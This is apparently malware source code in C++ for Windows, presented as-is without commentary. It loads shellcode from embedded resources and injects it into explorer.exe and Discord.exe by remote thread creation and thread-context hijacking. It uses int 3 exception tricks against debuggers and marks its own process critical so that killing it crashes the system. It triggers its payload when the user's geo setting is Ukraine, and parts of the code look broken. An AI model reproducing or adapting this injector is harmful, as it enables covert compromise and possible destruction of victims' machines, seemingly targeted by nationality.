#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <iomanip>
#include <Shlwapi.h>
#include <thread>
#include <stdio.h>
#include "resource.h"
#pragma comment( lib, "shlwapi.lib")

DWORD wf8kmain(unsigned int ags);

void L1BEL2()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        wf8kmain(0);
    }
}

void LABEL93()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        L1BEL2();
    }
}

_declspec(naked) void GoodBye()
{
    __asm
    {
        push ebp
        mov ebp, esp
        push 0
        push priest
        push rip
        push MB_OK
        call MessageBoxA
        pop ebp
        ret
    }
}

DWORD GetPID(const char* pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!_stricmp(pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}


DWORD EnThread(DWORD procID)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD ThID;
    if (procID == 0x0)
        EXIT_FAILURE;
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Thread32First(hSnap, &pE))
        {
            do
            {
                if (procID == pE.th32OwnerProcessID)
                {
                    ThID = pE.th32ThreadID;
                    break;
                }
            } while (Thread32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return(ThID);
}


BOOL ShInJ(int op)
{

    HANDLE status = NULL, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("explorer.exe"));
    if (!proc || !ExecBuffer[op])
        return 0;
    void* base = VirtualAllocEx(proc, NULL, Size[op], MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base)
    {
        CloseHandle(proc);
        return 0;
    }
    if (!WriteProcessMemory(proc, base, ExecBuffer[op], Size[op], 0))
    {
        CloseHandle(proc);
        return 0;
    }
    DWORD tmp = 0;
    if (!CreateRemoteThread(proc, NULL, Size[op], (LPTHREAD_START_ROUTINE)base, NULL, NULL, &tmp));
    return 0;
    CloseHandle(proc);
    return 1;
}

BOOL Bs8d(void) {
    HMODULE ntdll = LoadLibrary("ntdll.dll");
    if (!ntdll)
        return -1;
    PtrAdjPrv RtlAdjustPrivilege = (PtrAdjPrv)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    if (!RtlAdjustPrivilege)
        return 1;

    PtrSInfoProc NtSetInformationProcess = (PtrSInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!NtSetInformationProcess)
        return 1;
    PVOID tmp = 0;
    BOOLEAN tmp2 = 0;
    RtlAdjustPrivilege(19, TRUE, FALSE, &tmp2);
    NtSetInformationProcess(GetCurrentProcess(), 0x1d, &tmp, sizeof(ULONG));
    FreeLibrary(ntdll);

}

BOOL H8jk(int op)
{
    DWORD pr = 0;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    HANDLE htd, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("Discord.exe"));
    if (!proc || !ExecBuffer[op])
        return 0;
    void* base = VirtualAllocEx(proc, NULL, Size[op], MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base)
    {
        CloseHandle(proc);
        return 0;
    }
    if (!WriteProcessMemory(proc, base, ExecBuffer[op], Size[op], 0))
    {
        CloseHandle(proc);
        return 0;
    }
    htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
    if (!htd)
    {
        CloseHandle(proc);
        return 0;
    }
    if (SuspendThread(htd) == (DWORD)-1)
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return 0;
    }
    if (!GetThreadContext(htd, &context))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return 0;
    }
    context.Eip = (DWORD)base;
    if (!SetThreadContext(htd, &context))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return 0;
    }

    if (ResumeThread(htd) == (DWORD)-0b01)
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return 0;
    }
    __asm
    {
        push proc
        call CloseHandle
        push htd
        call CloseHandle
    }
    return 1;
}

HGLOBAL LoadExbff(int i, LPCSTR lpName)
{
    HRSRC shellcodeRe = FindResource(NULL, MAKEINTRESOURCE(IDR_WPR01 + i), lpName);
    if (!shellcodeRe)
        return NULL;

    Size[i] = SizeofResource(NULL, shellcodeRe);
    HGLOBAL ExBuffer = LoadResource(NULL, shellcodeRe);
    if (!ExBuffer)
        return NULL;
    return ExBuffer;
}

void KamiKaze(DWORD size,void *src)
{
    if (!src)
        return ;
    void* buff = VirtualAlloc(0, (SIZE_T)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy_s(buff,size,src,size);
    CreateRemoteThread(GetCurrentProcess(), NULL, size, (LPTHREAD_START_ROUTINE)buff, NULL, NULL, NULL);
    return;

}

DWORD wf8kmain(unsigned int ags)
{

    int i = -1;
    while (++i < 3)
    {
        ExecBuffer[i] = LoadExbff(i, lpnArr[i]);
        if (ShInJ(i))
            ScA += 1;
        if (i == 2)
        {
            while (i < 5)
            {
                ExecBuffer[i] = LoadExbff(i, lpnArr[i]);
                if (H8jk(i++))
                    ScA += 1;
            }
            return 2;
        }
    }
    if (ags == 1)
    {
        __asm
        {
            push 400
            call Sleep
        }
        wf8kmain(0);
    }
    if (!ScA)
    {
        i = 0;
        while (i < 6)
        {
            if (Size[i])
                KamiKaze(Size[i],ExecBuffer[i]);
            i++;
        }
    }

    return 0;
}

int wmain()
{

    if (GetUserGeoID(GEOCLASS_NATION) == UKR)
    {
        __try
        {
            __asm int 3;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
        {
            Bs8d();
            LABEL93();
        }
        __asm {
            push 0xcb
            call SetUserGeoID
        }
    }
    if (ScA)
    {
        Sleep(240000);
        __asm
        {
            mov eax, UKR
            sub eax, UKR
            push eax
            call exit
        }
    }
    __asm
    {
        xor eax, eax
        push eax
        call exit
    }
}
